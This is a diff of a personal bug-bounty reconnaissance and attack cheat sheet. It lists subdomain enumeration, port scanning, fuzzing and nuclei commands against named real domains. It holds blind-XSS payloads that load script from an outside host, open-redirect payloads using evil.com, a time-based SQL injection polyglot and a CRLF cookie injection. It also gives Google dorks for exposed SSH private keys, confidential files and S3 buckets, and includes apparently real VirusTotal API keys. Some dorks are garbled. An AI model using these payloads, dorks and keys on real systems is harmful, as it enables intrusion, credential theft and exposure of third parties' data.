@@ -12,18 +12,35 @@ https://www.falconebiz.com/
 
 
 
+Recon Methodology
+------------------>
+
 
 mkdir circlelytics
 cd /target
 
-subfinder -d canva.com >> subdomain.txt
+subfinder -dL wildcard.txt -all -recursive -o subfinder.txt
+assetfinder --subs-only example.com > assetfinder.txt
 
-//cat subdomain.txt | httpx -sc -td -ip
+curl -s "https://crt.sh/?q=%25domain.com&output=json" | jq -r '.[].name_value' | grep -Po '(\w+\.)+\w+$' > crtsh.txt
+
+amass enum -active -d example.com | grep -oE '([a-zA-Z0-9_\.-]+\.)+amazon\.com' | sort -u >amassactive.txt
+
+curl -s "http://web.archive.org/cdx/search/cdx?url=*.hackerone.com/*&output=text&fl=original&collapse=urlkey" | sort | sed -e 's_https\?://__' -e 's/^www\.//' | sort -u > wayback.txt
+
+curl -s "https://www.virustotal.com/vtapi/v2/domain/report?domain=<DOMAIN>&apikey=[api-key]" | jq -r '.domain_siblings[]? | .ip_address? // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' > virustotal.txt
+
+cat *.txt | sort -u > subdomains.txt
+
+cat subdomains.txt | httpx  -title -tech-detect -sc -td -ip | tee httpdetails.txt
 
 //duplicut subdomain.txt -o unique_sub.txt
 cat subdomain.txt | anew > unique_sub.txt
 
-httpx -l subdomain.txt -o unique_sub_live.txt
+cat subdomains.txt | httpx -l subdomains.txt -ports 443,80,8080,8000,8888 -threads 200 > unique_sub_live.txt
+
+nuclei -l unique_sub_live.txt -t /root/nuclei-templates/http/
+
 
 cat unique_sub_live.txt | waybackurls >> urls.txt
 //cat unique_sub_live.txt | getallurls >> urls.txt
@@ -32,59 +49,53 @@ cat unique_sub_live.txt | gau >> urls.txt
 //duplicut urls.txt -o unique_urls.txt
 cat urls.txt | anew > unique_urls.txt
 
+#IP
+curl -s "https://www.virustotal.com/vtapi/v2/domain/report?domain=<DOMAIN>&apikey=[api-key]" | jq -r '.. | .ip_address? // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
+
+curl -s "https://otx.alienvault.com/api/v1/indicators/hostname/<DOMAIN>/url_list?limit=500&page=1" | jq -r '.url_list[]?.result?.urlworker?.ip // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
+
+curl -s "https://urlscan.io/api/v1/search/?q=<DOMAIN>&size=10000" | jq -r '.results[].page?.ip // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
+
+shosubgo -d nasa.gov -s [shodan-apikey]
+shodan search ssl.cert.subject.CN:"<DOMAIN>" 200 --fields ip_str | httptoolkit -sc -title -server -td
+cat subdomain.txt | httptoolkit -ports 80,443,8080,8000,8888 --threads 200 > subdomains_alive.txt
 
 
+#Nmap
+while read -r unique_sub_live.txt; do
+  echo "[*] $unique_sub_live.txt"
+  nmap -sS -sV -T4 -p- "$unique_sub_live.txt" -oN "nmap_$(echo $unique_sub_live.txt | tr '/:' '__').txt"
+done < targets.txt
 
 
-# shodanx
-shodanx domain -d kick.com
+nuclei -l unique_urls.txt -t /root/custom_templates/ -o customtempalete.txt
 
-ssl.cert.subject.cn:*.target.com +200 os:"windows"
+
+cat unique_sub_live.txt| httpx -path /swagger-api/ -sc -content-length -mc 200 > swagger.txt
+
+katana -list unique_sub_live.txt -d 2 -jc -silent | grep -E '\.js([?#].*)?$' | sort -u > live_katana_js.txt
+
+dirsearch -l unique_sub_live.txt -x 500,502,429,404,400,403 -R 5 zip,bak,bkp.zip,tar,tar.bz2,tar.gz,txt,log,cache,secret,db,sql,sql.gz,sql.zip,sql.tar.gz,sql~,md5,backup,yml,json,gz,rar,config,git,env,env.example,conf,old,do,action,axd,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cgi,conf,csv,html,inc,jar,js,jsp,jsp~,lock,old,swp,swp~,wadl,log,xml,docker,wadl --random-agent -t 100 -F -o directory.txt 
 
 
 # Js Recone
-
-cat js.txt | grep -r -E “aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password|ftp password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret”
-
-
 #secretfinder
 cat unique_urls.txt | grep '.js' > js.txt
 cat js.txt | httpx -mc 200 | tee liveJs.txt
 
-nuclei -l js.txt -t ~/nuclei-templates/exposures/ -o js_exposures_results.txt
+nuclei -l liveJs.txt -t ~/custom_templates/git-templates/exposures/ -o js_exposures_results.txt
 
 
-waybackurls “site.com” | grep -Eo ‘https?://[^/]+/[^”]+\.js’ | sed ‘s|^https\?://[^/]\+/||’ | awk -F ‘/’ ‘{print $NF}’
+cat unique_urls.txt | grep -r -E “aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password|ftp password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret” > secret.txt
 
 
-curl -s https://app.site.com/config.js | \
-grep -E “environment: ‘Production’|storageUrl: ‘https://buildxact.blob.core.windows.net/'|googleApiKey: ‘|appInsightsInstrumentationKey: ‘|globalApiEndpoint: ‘|streamChatApiKey: ‘|auth0ClientId: ‘|auth0Domain: ‘|flatfileApiKey: ‘|webSpellCheckerServiceId: ‘|webSpellCheckerServiceUrl: ‘|clientPortalUrl: ‘|appVersion: ‘|appVersionDate: ‘|appDomainUrl: ‘|oneBuildKey: ‘|flatfilePlatformPublishableKey: ‘|flatfilePlatformEnvironmentId: ‘“ | \
-sed “s/.*’\(.*\)’.*/\1/”
-
-
-
-
-
-
-
-#fuzz
-
-torify dirsearch -u https://kingstreettownhouse.co.uk/ -r -e zip,bak,bkp.zip,tar,tar.bz2,tar.gz,txt,log,cache,secret,db,sql,sql.gz,sql.zip,sql.tar.gz,sql~,md5,backup,yml,json,gz,rar,config,git,env,env.example,conf,old,do,action,axd,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cgi,conf,csv,html,inc,jar,js,jsp,jsp~,lock,old,swp,swp~,wadl,log,xml,docker,wadl --random-agent
-
-
-#xss
+cat unique_urls.txt | grep "=" | qsreplace '"><img src=x onerror=alert(1)>' | freq | tee -a freq_output | grep -iv "Not Vulnerable" | tee -a freq_xss_findings
 
 cat unique_urls.txt | bxss -payload '"><script src=https://xss.report/c/akshay18></script>' -header "X-Forwarded-For"
+
 cat unique_urls.txt | grep "&" | bxss -appendMode -payload '"><script src=https://xss.report/c/akshay18></script>' -parameters
+
 cat unique_urls.txt | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | urldedupe -s | grep -IE "[?].*[&]?" | grep "=" | unew | qsreplace '<sCript>confirm(1)</sCript>, <script>confirm(1)</script>,">"/><svg onload=prompt(document.domain)>' | xsschecker -match '<sCript>confirm(1)</sCript>, <script>confirm(1)</script>,">"/><svg onload=prompt(document.domain)>' -vuln 
-
-
-# Automation scan
-
-shortscan https://www.preloved.co.uk/ -F
-nikto -h https://domain.com
-
-#Also scan with zapproxy
 
 
 #http smugging (cd smuggler)
@@ -93,85 +104,29 @@ python3 /root/smuggler/smuggler.py -u <urls>
 #cache_checking
 toxicache -i unique_sub_live.txt
 
+#Open Redirect
+cat allurls.txt | gf redirect > redirect_candidates.txt
+cat redirect_candidates.txt | uro | qsreplace 'https://evil.com' | httpx-toolkit -fr -sc -o redirect_results.txt
 
-cat domains.txt | nuclei -t openRedirect.yaml --retries 2
-cat domains.txt | nuclei -t wp-setup-config.yaml
-cat domains.txt | nuclei -t iis.yaml -c 30
-cat domains.txt | nuclei -t gitExposed.yaml 
-cat domains.txt | nuclei -t cors.yaml
-cat domains.txt | nuclei -t  credentials-disclosure-all.yaml -c 30
-cat domains.txt | nuclei -t blind-ssrf.yaml -c 30 -dast
-cat domains.txt | nuclei -t errorsqli.yaml -dast
-cat domains.txt | nuclei -t cRlf.yaml -rl 50 -c 30
+
+cat unique_sub_live.txt | nuclei -t /root/custom_templates/openRedirect.yaml --retries 2
+cat unique_sub_live.txt | nuclei -t /root/custom_templates/wp-setup-config.yaml
+cat unique_sub_live.txt | nuclei -t /root/custom_templates/iis.yaml -c 30
+cat unique_sub_live.txt | nuclei -t /root/custom_templates/gitExposed.yaml 
+cat unique_sub_live.txt | nuclei -t /root/custom_templates/cors.yaml
+cat unique_sub_live.txt | nuclei -t /root/custom_templates/credentials-disclosure-all.yaml -c 30
+cat unique_sub_live.txt | nuclei -t /root/custom_templates/blind-ssrf.yaml -c 30 -dast
+cat unique_sub_live.txt | nuclei -t /root/custom_templates/errorsqli.yaml -dast
+cat unique_sub_live.txt | nuclei -t /root/custom_templates/cRlf.yaml -rl 50 -c 30
 
 
 curl -H 'Origin: http://example.com' -I https://domain.com/wp-json/ | grep -i -e 'access-control-allow-origin' -e 'access-control-allow-methods' -e 'access-control-allow-credentials'
 curl -H 'Origin: http://example.com' -I https://domain.com/wp-json/
 
 
-subfinder -d domain.txt -all -slent | httpx -path /swagger-api/ -sc -content-length -mc 200
-https://gist.githubusercontent.com/zenelite123/af28f9b61759b800cb65f93ae7227fb5/raw/04003a9372ac6a5077ad76aa3d20f2e76635765b/test.json
-
-curl -I "https://domain.com/%0aSet-Cookie:coffin=hi;"
 
 
-recon Tools
-
-1. https://app.pentester.com/
-2. https://dork.bugbountyhunting.com/
-3. https://pentest-tools.com/information-gathering/google-hacking
-4. BigBountyRecon 
-## github dorking
-5. Reconftw
-6. spiderfoot
-7.https://web.archive.org/cdx/search/cdx?url=*.brex.com/*&output=text&fl=original&collapse=urlkey waybackurls -->
-8. https://sawravchy.github.io/archivefinder/
-
-
-
-
->> DORKING RECON
-
-#things I tried searching
-site:myprotein.com ext:pdf
-site:myprotein.com ext:pdf "CONFIDENTIAL"
-site:myprotein.com ext:pdf "STRICTLY CONFIDENTIAL"
-site:myprotein.com ext:pdf "HIGHLY CONFIDENTIAL"
-site:myprotein.com ext:pdf "PRIVATE"
-site:myprotein.com ext:pdf "PRIVATE AND CONFIDENTIAL"
-site:myprotein.com ext:pdf "PRIVATE AND SENSITIVE"
-site:myprotein.comm ext:pdf "COMPANY SENSITIVE"
-site:myprotein.com "Uncaught Error: Call to undefined function"
-site:myprotein.com "error in your SQL"
-site:myprotein.com "WordPress database error:"
-"PHP Fatal"
-site:*.gov.* "not found in C:\"
-site:*.gov.* "not found in D:\"
-site:*.gov.* "not found in E:\"
-site:*.gov.* "not found in F:\"
-site:target.com "Unclosed quotation mark"
-site:target.com "Error Executing Database Query"
-site:myprotein.com "mysql_num_rows()" "error"
-site:myprotein.com "mysql_fetch_array()" "error"
-site:myprotein.com "mysql_query()" "error"
-site:myprotein.com intext:"sql syntax near" OR intext:"syntax error" OR intext:"unexpected end of SQL" OR intext:"Warning: mysql_" OR intext:"pg_connect()" OR intext:"error in your SQL syntax" OR intext:"OLE DB Provider for SQL Server"
-
-&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
-
-good #github #Tips
-“site.com" password or secret or any keyword
-“target.atlassian” password or secret or any keyword
-“target.okta” password or secret or any keyword
-“corp.target" password or secret or any keyword
-“jira.target" password or secret or any keyword
-“target.onelogin” password or secret or any keyword
-target.service-now password or secret or any keyword
-
-
-👉 https://github.com/techgaun/github-dorks/blob/master/github-dorks.txt
-👉 https://orwaatyat.medium.com/your-full-map-to-github-recon-and-leaks-exposure-860c37ca2c82
-
-==============================================================
+===================================================================================================================================================================================
 
 >> Finding Origin IP
 
@@ -218,6 +173,207 @@ target.service-now password or secret or any keyword
 
 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++=
 
+
+
+##Recone Manually
+
+recon Tools
+
+1. https://app.pentester.com/
+2. https://dork.bugbountyhunting.com/
+3. https://pentest-tools.com/information-gathering/google-hacking
+4. BigBountyRecon 
+## github dorking
+5. Reconftw
+6. spiderfoot
+7.https://web.archive.org/cdx/search/cdx?url=*.brex.com/*&output=text&fl=original&collapse=urlkey waybackurls -->
+8. https://sawravchy.github.io/archivefinder/
+
+
+https://lostsec.xyz/coffin/dorking.html
+
+## Bing
+
+## Github
+example.com NOT www.bugcrowd NOT api.bugcrowd language:python secret_key
+
+
+## web archive
+https://web.archive.org/cdx/search/cdx?url=*.nicehash.com/*&output=text&fl=original&collapse=urlkey
+
+
+## Virustotal
+https://www.virustotal.com/vtapi/v2/domain/report?apikey={APIKEY}&domain={DOMAIN}
+https://www.virustotal.com/vtapi/v2/domain/report?apikey=a9721c169073a5be8f1a625d69e219b5625a52c8a48d3edda03cde3ffae97fe8&domain=zoho.com
+
+
+## Alien vault
+https://otx.alienvault.com/api/v1/indicators/{TYPE}/{DOMAIN}/url_list?limit=500&page=1
+
+Type:hostname/domain
+DOMAIN:domain
+
+Urlscan
+https://urlscan.io/api/v1/search/?q=domain:{DOMAIN}{DATERANGE}&size=10000
+
+##Blind XSS endpoints
+https://lostsec.xyz/coffin/dorking.html
+
+
+
+>> DORKING RECON
+
+#things I tried searching
+site:myprotein.com ext:pdf
+site:myprotein.com ext:pdf "CONFIDENTIAL"
+site:myprotein.com ext:pdf "STRICTLY CONFIDENTIAL"
+site:myprotein.com ext:pdf "HIGHLY CONFIDENTIAL"
+site:myprotein.com ext:pdf "PRIVATE"
+site:myprotein.com ext:pdf "PRIVATE AND CONFIDENTIAL"
+site:myprotein.com ext:pdf "PRIVATE AND SENSITIVE"
+site:myprotein.comm ext:pdf "COMPANY SENSITIVE"
+site:myprotein.com "Uncaught Error: Call to undefined function"
+site:myprotein.com "error in your SQL"
+site:myprotein.com "WordPress database error:"
+"PHP Fatal"
+
+
+filetype:xls inurl:"email.xls"
+intitle:"Apache2 ubuntu default Page:it work"
+allintitle:restricted filetype:doc site:gov
+intitle:"index of" inurl:ftp
+allintext:username filetype:log
+
+
+site:*.gov.* "not found in C:\"
+site:*.gov.* "not found in D:\"
+site:*.gov.* "not found in E:\"
+site:*.gov.* "not found in F:\"
+site:target.com "Unclosed quotation mark"
+site:target.com "Error Executing Database Query"
+site:myprotein.com "mysql_num_rows()" "error"
+site:myprotein.com "mysql_fetch_array()" "error"
+site:myprotein.com "mysql_query()" "error"
+site:myprotein.com intext:"sql syntax near" OR intext:"syntax error" OR intext:"unexpected end of SQL" OR intext:"Warning: mysql_" OR intext:"pg_connect()" OR intext:"error in your SQL syntax" OR intext:"OLE DB Provider for SQL Server"
+
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+Google Dorking for AWS S3 Buckets
+------------------------------------>
+
+site:s3.amazonaws.com "target.com"
+site:*.s3.amazonaws.com "target.com"
+site:s3-external-1.amazonaws.com "target.com"
+site:s3.dualstack.us-east-1.amazonaws.com "target.com"
+site:amazonaws.com inurl:s3.amazonaws.com 
+site:s3.amazonaws.com intitle:"index of"  
+site:s3.amazonaws.com inurl:".s3.amazonaws.com/"  
+site:s3.amazonaws.com intitle:"index of" "bucket"
+
+(site:*.s3.amazonaws.com OR site:*.s3-external-1.amazonaws.com OR site:*.s3.dualstack.us-east-1.amazonaws.com OR site:*.s3.ap-south-1.amazonaws.com) "target.com"
+
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+
+good #github Dorking #Tips
+“vuoriclothing.com" password or secret or any keyword
+“target.atlassian” password or secret or any keyword
+“target.okta” password or secret or any keyword
+“corp.target" password or secret or any keyword
+“jira.target" password or secret or any keyword
+“target.onelogin” password or secret or any keyword
+target.service-now password or secret or any keyword
+
+
+👉 https://github.com/techgaun/github-dorks/blob/master/github-dorks.txt
+👉 https://orwaatyat.medium.com/your-full-map-to-github-recon-and-leaks-exposure-860c37ca2c82
+
+
+## git dorking
+
+https://obheda12.medium.com/gitdorker-a-new-tool-for-manual-github-dorking-and-easy-bug-bounty-wins-92a0a0a6b8d5
+
+https://sudoninja.gitbook.io/sudoninjabook/security-area/bug-bounty-hunting/bug-bounty-platform
+
+
+if(now()=sysdate(),sleep(3),0)/*'XOR(if(now()=sysdate(),sleep(3),0))OR'"XOR(if(now()=sysdate(),sleep(3),0))OR"*/
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------
+##Find Subdomain Takeover using Google Dorking##
+
+site:"*.tesla.com" | intext:"PAGE NOT FOUND" | intext:"project not found" | intext:"Repository not found" | intext:"domain does not exist" | intext:"This page could not be found" | intext:"404 Blog is not found" | intext:"No settings were found for this company" | intext:"domain name is invalid"
+
+
+
+==$$$ File Edit View Search Tools
+
+ffuf -recursion -mc all acce.htm,.shtml.php..html..js..txt.zip, bak, asp..aspx..xml..sql..old,.at..inc w path -u https://target.com/FUZZ -t 5000 
+
+
+#### Another set of Google Dorks for your first Bug-Bounty programs:
+
+site:hoseasons.co.uk | inurl: http | inurl:url= | inurl: path | inurl: destinurl: html | inurl:data | inurl:domain | inurl:page 
+
+
+
+----> inurl: include | inurl dir | inurl: detail | inurl: file= | inurl: do | inurl: run | inurl: read | inurl: ping inurt & siteinurl:folder| inurl:inc |inurl:locate | inurl: doc| inurl:            conf inurl: & nicehash.com
+
+
+
+site:*.nicehash.com | inurl: cnd | inurl: exec| inurl:query | inurl:code 
+
+site:*.nicehash.com | inurl:config| inurl: env |inurl: setting |inurl: backup| inurl:aiminurl:php 
+
+site:*.nicehash.com | creditkarma.cominurl:email | inuxlphone| inurl:password 
+
+inurl: apidocs I inurl: api-docs I inurl: swagger site: "target [.]com" inurl: secret inurl: & I inurl:api-explorer
+
+
+Some cool dorks that will get you started in Bug-Bounty Hunting:
+
+site: target.com ext: php inurl:7 
+
+-site: openbugbounty.org inurl: reports intext: "caffeine.tv"
+
+
+site:*.nicehash.com | inurl: q | inurl: s | inurl: search | inurl: query= | inurl: keyword | inurl: lang 
+
+
+site:*.nicehash.com |  ext: log | ext txt | ext:canf | ext: cnf ext: ini | ext: env | ext: sh | ext bak | ext backup ext: swp ext: old | ext: ext: git | ext: svn ext: htpasswd ext: htaccess inurl: url inurl: return | Inurl: next inurl: redirect inurl: redir inurl: ret inurl: r2 inurl: page 
+
+
+###open redirect#####
+
+site:*.target.com | inurl: id= | inurl: pid= | inurl category= | inurl:cat= | inurl: action= | inurl: sid= | inurl: dir= 
+
+
+ Finding SQL Injection with Google Dorks is pretty interesting. And it's pretty simple:
+"gcore.com" inurl: index.php?id=
+
+So, some dorks are:
+
+Plain Text Tab Width: 
+
+You can simply find open login page from google dorking . Like this
+Dork site:=.*.*.wur.nl inurl:login | inurl:signin | intitle:Login | intitle:”sign in” | inurl:auth
+
+Dork site:=.*.*.hoseasons.co.uk inurl:login | inurl:signin | intitle:Login | intitle:”sign in” | inurl:auth
+
+
+site:*.dell.com (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)
+
+--------------------------------------------------------------------------
+🗝️SSH Private Key - Bug Bounty Hunting
+
+intitle:"index of /.ssh"
+intitle:"index of /" intext:id_rsa
+intitle:"index of" "id_rsa" site:*.gov
+intitle:"index of" "id_rsa" site:*.gov.*
+intitle:"index of" "id_rsa" site:*.edu
+intitle:"index of" "id_rsa" site:*.edu.*
+intitle:"index of" "id_rsa" site:*.domain.com
+
+==============================================================
 ---------> reconesence###
 
 pentester.com
@@ -228,27 +384,14 @@ shodan.io -->  ssl.cert.subject.cn:audiobooks.com
 click on (open more) than you will found new page where mention more thinh
 
 
+
+# shodanx
+shodanx domain -d kick.com
+
+ssl.cert.subject.cn:*.target.com +200 os:"windows"
+
 shodan search Ssl.cert.subject.CN:"myprotein.com" 200 --fields ip_str | httpx-toolkit -sc -title -server -td
 
-
-------------------------------------------------------------------------------------------------------------------------------------------------
-API KEY 
-
-https://github.com/streaak/keyhacks
-
-
-
-JsRecon methodology By .............
-
-katana -u target.com -d 5 -jc | grep'\.js$' | tee alljs.txt
-echo target.com | gau | '\.js$' | anew alljs.txt
-cat alljs.txt | uro | sort -u | httpx -mc 200 -o target.txt
-
-
- cat target.txt | xargs -I{} bash -c 'echo -e "\ntarget : {}\n" && python lazyegg.py "{}" --js_urls --domains --ips --leaked_creds --local_storage'
-
-
-waybackurls vulnweb.com | grep '\.js$' | awk -F '?' '{print $1}' | sort -u | xargs -I{} bash -c 'python lazyegg.py "{}" --js_urls --domains --ips' > jsurls.log && cat jsurls.log | grep '\.' | sort -u
 
 
 
@@ -259,7 +402,7 @@ waybackurls vulnweb.com | grep '\.js$' | awk -F '?' '{print $1}' | sort -u | xar
 
 https://web.archive.org/cdx/search/cdx?url=*.seek.com/*&collapse=urlkey&output=text&fl=original
 
-https://web.archive.org/cdx/search/cdx?url=*.bugbountyhunter.xyz/*&output=text&fl=original&collapse=urlkey&filter=statuscode:200
+https://web.archive.org/cdx/search/cdx?url=*.angelone.in/*&output=text&fl=original&collapse=urlkey&filter=statuscode:200
 
 https://www.virustotal.com/vtapi/v2/domain/report?apikey=982680b1787fa59701919aa22515a025e00df1e3bb2bc4f186b8e919558d576c&domain=example.com
 
@@ -336,16 +479,6 @@ cli=
 cmd=
 
 
-========================================================================================================
-
-git dorking
-
-https://obheda12.medium.com/gitdorker-a-new-tool-for-manual-github-dorking-and-easy-bug-bounty-wins-92a0a0a6b8d5
-
-https://sudoninja.gitbook.io/sudoninjabook/security-area/bug-bounty-hunting/bug-bounty-platform
-
-
-if(now()=sysdate(),sleep(3),0)/*'XOR(if(now()=sysdate(),sleep(3),0))OR'"XOR(if(now()=sysdate(),sleep(3),0))OR"*/
 
 
 
@@ -365,6 +498,8 @@ toxicache -i subdomain.txt
  paramspider -d example.com -p '"><h1>reflection</h1>'
 https://github.com/shmilylty/OneForAll
 bugsnag
+
+Subzy
 
 
 Devils World
